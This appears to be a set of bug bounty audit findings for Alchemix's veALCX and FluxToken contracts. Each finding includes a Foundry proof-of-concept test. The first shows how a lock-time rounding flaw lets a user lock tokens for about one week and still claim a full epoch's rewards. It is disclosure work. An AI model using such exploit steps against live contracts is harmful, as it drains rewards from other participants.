# [H-1] BPT can be locked for only 1 week, resulting in unfair ALCX reward distribution

## Brief/Intro

The 80/20 ALCX/WETH BPT has a minimum lock period of 1 epoch (2 weeks). However, a flaw allows malicious actors to lock their BPT for just 1 week, resulting in unfair ALCX reward distribution. This means a malicious actor can unfairly claim rewards without meeting the minimum 2-week lock requirement.

## Vulnerability Details

The `_createLock()` function is responsible for creating a lock when depositing Balancer Pool Tokens in `VotingEscrow`. It should enforce a minimum lock period of 1 epoch (2 weeks):

```solidity
    function _createLock(
        uint256 _value,
        uint256 _lockDuration,
        bool _maxLockEnabled,
        address _to
    ) internal returns (uint256) {
	    // ...
        uint256 unlockTime = /** ... */ ((block.timestamp + _lockDuration) / WEEK) * WEEK;

        // ...
        require(unlockTime >= (((block.timestamp + EPOCH) / WEEK) * WEEK), "Voting lock must be 1 epoch");

        // ...
    }
```

However, this check is flawed. A malicious actor can lock BPTs for just 1 week instead of the required 2 weeks. This allows them to unjustly receive rewards as if they had locked their BPTs for a whole epoch, effectively stealing rewards from other participants.

**Example Scenario:**

- Next epoch starts at `1717632000` (Thu Jun 06 2024 00:00:00 UTC)

1. Alice locks 1 BPT for `2 weeks` (1 epoch) at `block.timestamp = 1716422401` (Thu May 23 2024 00:00:01 UTC)
2. Bob locks 1 BPT for `7 days + 1 seconds` at `block.timestamp = 1717027199` (Wed May 29 2024 23:59:59 UTC)
3. The epoch resets on `1717632000` (Thu Jun 06 2024 00:00:00 UTC)

**Expected behavior:** Bob should not be able to lock his BPT for less than 1 epoch (2 weeks).

**Actual behavior:** Alice and Bob receive equal rewards.

Bob circumvents the minimum lock duration check. Here’s why:

```solidity
block.timestamp = 1717027199

unlockTime = ((block.timestamp + _lockDuration) / WEEK) * WEEK

unlockTime = ((1717027199 + 7 days + 1 seconds) / WEEK) * WEEK

unlockTime = 1717632000
```

The check performed:

```
unlockTime >= (((block.timestamp + EPOCH) / WEEK) * WEEK)

1717632000 >= (((1717027199 + 2 weeks) / 1 weeks) * 1 weeks)

1717632000 >= 1717632000
```

The check passes for Bob, even though his lock time is only `7 days + 1 second`.

## Impact Details

The flawed minimum lock time check allows users to lock BPTs for only 1 week but still receive rewards for a full epoch. This results in unfair reward distribution, with malicious users effectively stealing rewards from others.

## References

https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1375-L1381

## Proof of Concept

The following coded PoC demonstrates the issue.

Add the following test case to `VotingEscrow.t.sol`:

```solidity
    function test_can_create_lock_for_less_than_1_epoch() public {
        console.log(newEpoch());

        address alice = address(1337);
        vm.label(alice, "Alice");
        address bob = address(31337);
        vm.label(bob, "Bob");

        // Mint Alice & Bob some BPT
        deal(bpt, alice, 10e18);
        deal(bpt, bob, 10e18);

        // Warp time to exactly 2 weeks before the new epoch
        hevm.warp(newEpoch() - 2 weeks); 

        hevm.startPrank(alice);
        IERC20(bpt).approve(address(veALCX), 1e18);
        uint256 aliceTokenId = veALCX.createLock(1e18, 2 weeks, false);
        voter.reset(aliceTokenId);
        // Alice locks 1 BPT for 2 weeks (the minimum lock period) and reset the tokenId
        hevm.stopPrank();

        // Warp time to 7 days and 2 seconds before the next epoch starts
        hevm.warp(newEpoch() - (7 days + 2 seconds));

        hevm.startPrank(bob);
        IERC20(bpt).approve(address(veALCX), 1e18);
        uint256 bobTokenId = veALCX.createLock(1e18, 7 days + 1 seconds, false);
        // Bob succeeds in locking 1 BPT for 7 days + 1 seconds which is less than the required minimum lock period of 1 epoch (2 weeks)
        voter.reset(bobTokenId);
        hevm.stopPrank();

        // Warp time to the start of the new epoch
        hevm.warp(newEpoch());

        // Distribute the rewards
        voter.distribute();

        // Print the unclaimed rewards accrued by Alice & Bob
        console.log("Unclaimed ALCX (Alice): %s", distributor.claimable(aliceTokenId));
        console.log("Unclaimed FLUX (Alice): %s", flux.getUnclaimedFlux(aliceTokenId));

        console.log("Unclaimed ALCX (Bob): %s", distributor.claimable(bobTokenId));
        console.log("Unclaimed FLUX (Bob): %s", flux.getUnclaimedFlux(bobTokenId));
    }
```

Make sure the following entries are updated in `Makefile`:

```sh
# file to test 
FILE=VotingEscrow

# specific test to run
TEST=test_can_create_lock_for_less_than_1_epoch
```

Run the PoC via:

```sh
make test_file_test
```

PoC output:

```sh
Ran 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] test_can_create_lock_for_less_than_1_epoch() (gas: 3647937)
Logs:
  1717632001
  Epoch emissions: 12594000000000000000000
  veALCX emissions: 8186100000000000000000
  Unclaimed ALCX (Alice): 1023262077024604404512
  Unclaimed FLUX (Alice): 38356132673449616
  Unclaimed ALCX (Bob): 1023262077024604404512
  Unclaimed FLUX (Bob): 19178113901412783

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 45.46s (33.49s CPU time)

Ran 1 test suite in 46.90s (45.46s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

# [H-2] Precision loss causes minor loss of FLUX when claiming with NFTs

## Brief/Intro

The `FluxToken` contract allows users to claim FLUX tokens in exchange for their Alchemech or alETH NFTs. However, an error in the calculation within the contract leads to precision loss, causing users to lose small a dust amount of FLUX.

## Vulnerability Details

Users can claim FLUX tokens by calling the `FluxToken#nftClaim()` function with their Alchemech or alETH NFTs. This function relies on the `FluxToken#getClaimableFlux()` function to determine the amount of FLUX the user should receive. The `claimableFlux` is calculated as follows:

```solidity
claimableFlux = (((bpt * veMul) / veMax) * veMax * (fluxPerVe + BPS)) / BPS / fluxMul;
```

In this formula, there is an unnecessary division by `veMax` followed by a multiplication by the same `veMax` value. This redundant operation introduces precision loss which in turn causes the user to lose a small (dust) amount of FLUX.

## Impact Details

The `claimableFlux` formula contains an unnecessary calculation that leads to a precision loss which causes a loss of dust for the users.

## References

https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L224

## Proof of Concept

The following coded PoC demonstrates the issue.

Add the following test case to `FluxToken.t.sol`:

```solidity
    function test_getClaimableFlux_causes_unnecessary_lost_of_dust_due_to_incorrect_calculation() external {
        address dummyNFT = address(0x31337);
        uint256 amount = 10 ether;

        uint256 veMul = VotingEscrow(flux.veALCX()).MULTIPLIER();
        uint256 veMax = VotingEscrow(flux.veALCX()).MAXTIME();
        uint256 fluxPerVe = VotingEscrow(flux.veALCX()).fluxPerVeALCX();
        uint256 fluxMul = VotingEscrow(flux.veALCX()).fluxMultiplier();

        uint256 expectedClaimableFlux = ((amount * flux.bptMultiplier() * veMul) * (fluxPerVe + BPS)) / BPS / fluxMul;
        uint256 actualClaimableFlux = flux.getClaimableFlux(amount, dummyNFT);
        
        console2.log("Expected claimable FLUX: %s", expectedClaimableFlux);
        console2.log("Actual claimable FLUX: %s", actualClaimableFlux);
    }
```

Make sure the following entries are updated in `Makefile`:

```sh
# file to test 
FILE=FluxToken

# specific test to run
TEST=test_getClaimableFlux_causes_unnecessary_lost_of_dust_due_to_incorrect_calculation
```

Run the PoC via:

```sh
make test_file_test
```

PoC output:

```sh
Ran 1 test for src/test/FluxToken.t.sol:FluxTokenTest
[PASS] test_getClaimableFlux_causes_unnecessary_lost_of_dust_due_to_incorrect_calculation() (gas: 35008)
Logs:
  Expected claimable FLUX: 300000000000000000000
  Actual claimable FLUX: 299999999999992086000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.84s (649.51ms CPU time)

Ran 1 test suite in 16.97s (15.84s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

# [L-1] veALCX does not comply with ERC721, breaking composability

## Brief/Intro

veALCX is intended to be ERC721 compliant. However, it does not comply with ERC721 due to broken EIP165 implementation which is mandated by the ERC721 specification.

## Vulnerability Details

The [ERC721 specification](https://eips.ethereum.org/EIPS/eip-721) states the following:

> **Every ERC-721 compliant contract must implement the `ERC721` and `ERC165` interfaces**

This means that every compliant ERC721 token must implement EIP-165 and return `true` for all supported interfaces. veALCX (`VotingEscrow.sol`) implements both `IERC721` and `IERC721Metadata`. However, the `VotingEscrow#supportInterface()` does not work as intended:

```sol
    function supportsInterface(bytes4 _interfaceID) external pure returns (bool) {
        revert("function not supported");
    }
```

As per the [EIP-165 specification](https://eips.ethereum.org/EIPS/eip-165#how-to-detect-if-a-contract-implements-erc-165), this implementation does not comply with EIP-165 (which is mandated by ERC721):

> How to Detect if a Contract Implements ERC-165
> 
> 1. The source contract makes a `STATICCALL` to the destination address with input data: `0x01ffc9a701ffc9a700000000000000000000000000000000000000000000000000000000` and gas 30,000. This corresponds to `contract.supportsInterface(0x01ffc9a7)`.
> 2. If the call fails or return false, the destination contract does not implement ERC-165.

Thus, `VotingEscrow` does not implement EIP-165 and is not ERC721 compliant. 

In pursuit of thoroughness and transparency, it's crucial to reference  **Finding 6.45** in [Chainsecurity's audit](https://drive.google.com/file/d/1YsO1t1-hSK1wkHajT_GAZ-u35O1Su74X/view) which reports broken/partial EIP165 support. However, the applied fix is incorrect and breaks the intended compliance with ERC721. Recognizing and addressing the currently reported issue is vital for the compliance and composability of the veALCX token. 

## Impact Details

The token does not comply with the ERC721 standard, which causes composability and interoperability issues. This leads to failures when other contracts and DApps expect standard behaviors that the token does not provide, potentially causing disruptions, reducing its utility, and diminishing trust in the token's reliability.

## References

Problematic implementation:

- https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L174-L176

Docs references which state that ERC721 compliance is expected:

- https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L16

- https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/CONTRACTS.md

## Proof of Concept

Add the following test to `src/test/VotingEscrow.t.sol`:

```sol

    function test_eip165_compliance_is_broken() public {
        // As per https://eips.ethereum.org/EIPS/eip-721#specification:
        // "Every ERC-721 compliant contract must implement the ERC721 and ERC165 interfaces"
        assertEq(veALCX.supportsInterface(0x01ffc9a7), true); // ERC165
        assertEq(veALCX.supportsInterface(0x80ac58cd), true); // ERC721
        assertEq(veALCX.supportsInterface(0x5b5e139f), true); // ERC721Metadata
    }
```

Make sure the following entries are updated in `Makefile`:

```sh
# file to test 
FILE=VotingEscrow

# specific test to run
TEST=test_eip165_compliance_is_broken
```

Run the PoC via `make test_file_test`

# [L-2] Incorrect implementation of `ownerOf()` makes veALCX non-ERC721 compliant

## Brief/Intro

The ERC721 standard requires that ownership queries for NFTs assigned to the zero address must revert, signaling invalid ownership. However, the `VotingEscrow#ownerOf()` implementation in veALCX returns `address(0)` instead, violating this standard. This deviation risks causing functional and security issues in external systems that integrate with veALCX and rely on standard ERC721 behavior.

## Vulnerability Details

The [ERC721 specification](https://eips.ethereum.org/EIPS/eip-721) states the following:

```
    /// @notice Find the owner of an NFT
    /// @dev NFTs assigned to zero address are considered invalid, and queries
    ///  about them do throw.
    /// @param _tokenId The identifier for an NFT
    /// @return The address of the owner of the NFT
    function ownerOf(uint256 _tokenId) external view returns (address);
```

This means that every compliant ERC721 token must implement the `ownerOf()` function so that it throws if a `_tokenId` is passed that belongs to `address(0)`. However, `VotingEscrow`'s implementation looks like this:

```sol
    /// @inheritdoc IVotingEscrow
    function ownerOf(uint256 _tokenId) public view override(IERC721, IVotingEscrow) returns (address) {
        return idToOwner[_tokenId];
    }
```

For a non-existent `_tokenId`, this implementation will return `address(0)` instead of reverting. This behavior is not compliant with the ERC721 specification.

This non-compliance can lead to serious compatibility issues with external integrations that rely on standard ERC721 behavior. Applications expecting a revert when querying ownership of an invalid NFT might instead receive a non-reverting response, potentially resulting in erroneous processing or security vulnerabilities in systems interacting with veALCX.

## Impact Details

Non-compliance with the ERC721 standard in veALCX's implementation could lead to interoperability issues and security vulnerabilities in external systems that rely on standard behavior for processing ownership data. This could result in erroneous executions and potential breaches in decentralized applications interfacing with veALCX.

To better demonstrate the potential impact of this vulnerability, I have developed a PoC that showcases how this issue could lead to a permanent loss of NFTs. Please see it in the Proof of Concept section below.

## References

Problematic implementation:

https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L230-L232

Docs references which state that ERC721 compliance is expected:

- https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L16

- https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/CONTRACTS.md

## Proof of Concept

Let's examine a hypothetical scenario:

**Context:** LiquidityHub is a fictional platform where users can stake their veALCX. In return, they receive enhanced rewards. The LiquidityHub manages these veALCXes, allowing users to stake on behalf of the hub and later redeem them. Upon redemption, LiquidityHub deducts an exit service fee before returning the remaining balance to the user.

Here’s how the vulnerability could result in Alice's veALCX becoming irretrievably stuck:

1. Alice uses the `VotingEscrow` contract to create a veALCX lock on behalf of the `LiquidityHub`, which assigns the ownership of the veALCX to the LiquidityHub.
2. Alice calls the `stake()` function on the `LiquidityHub` contract with the veNFT's token ID. The function verifies that the LiquidityHub is the owner before marking it as staked.
3. When Alice wishes to redeem, she calls `startCooldown()` and after the cooldown period expires triggers the `redeem()` function in the LiquidityHub.
4. The LiquidityHub calls `withdraw()` in the `VotingEscrow` to "burn" the veALCX and withdraw the BPT tokens.
5. The LiquidityHub checks the burn status by expecting the `ownerOf()` call to revert, indicating the token no longer exists.
6. If `ownerOf()` does not revert and returns any address, the LiquidityHub reverts the transaction, signaling an unsuccessful burn. If `ownerOf()` reverts, the LiquidityHub clears its record of the token, recognizing the successful redemption and burn.

The following coded PoC code illustrates the potential impact and how the veALCX can remain stuck due to a failed validation of its burned status.

Add the following contract at the end of `VotingEscrow.t.sol`:

```sol

contract LiquidityHub {
    VotingEscrow public veALCX;
    mapping(uint256 => address) public stakedTokens;

    constructor(address _veALCX) {
        veALCX = VotingEscrow(_veALCX);
    }

    // Function for Alice to stake her veALCX which is already in the name of this hub
    function stake(uint256 tokenId) external {
        require(veALCX.ownerOf(tokenId) == address(this), "Hub is not the owner");

        // Marking the token as staked
        stakedTokens[tokenId] = msg.sender;
    }

    function startCooldown(uint256 tokenId) external {
        require(veALCX.ownerOf(tokenId) == address(this), "Hub is not the owner");
        require(stakedTokens[tokenId] == msg.sender, "Not staked by you");

        veALCX.startCooldown(tokenId);
    }

    // Function to redeem the veALCX and encounter the issue
    function redeem(uint256 tokenId) external {
        require(stakedTokens[tokenId] == msg.sender, "Not staked by you");

        // Call withdraw from veALCX
        veALCX.withdraw(tokenId);

        // Use try-catch to check if the token has been successfully burned
        try veALCX.ownerOf(tokenId) {
            // If this call does not fail, then assume the token was not burned successfully
            revert("Token not burned properly");
        } catch {
            // Catch the error to confirm token is burned
            // Only reach here if ownerOf() reverts, which is expected upon successful burn
        }

        // Clear the staking record
        delete stakedTokens[tokenId];

        // Additional logic to handle the release of funds or other benefits to the user
        // E.g. send 5% fee to LiquidityHub treasury + remaining funds to Alice
    }
}
```

Also, add the following test case to `VotingEscrowTest`:

```sol
    function test_incorrect_erc721_ownerof_implementation_can_lead_to_nft_loss() public {
        address alice = address(31337);
        LiquidityHub liquidityHub = new LiquidityHub(address(veALCX));
        deal(bpt, alice, 50 ether); // Make sure Alice has some BPT

        vm.startPrank(alice);
        IERC20(bpt).approve(address(veALCX), 10 ether);
        uint256 tokenId = veALCX.createLockFor(10 ether, 180 days, false, address(liquidityHub));
        liquidityHub.stake(tokenId);

        vm.warp(block.timestamp + 181 days);

        liquidityHub.startCooldown(tokenId);

        vm.warp(block.timestamp + 7 days);

        liquidityHub.redeem(tokenId);
        vm.stopPrank();
    }
```

Make sure the following entries are updated in `Makefile`:

```sh
# file to test 
FILE=VotingEscrow

# specific test to run
TEST=test_incorrect_erc721_ownerof_implementation_can_lead_to_nft_loss
```

Run the PoC via `make test_file_test`

This example is streamlined to focus on the core issue, leaving out many details of the LiquidityHub’s operations for clarity.
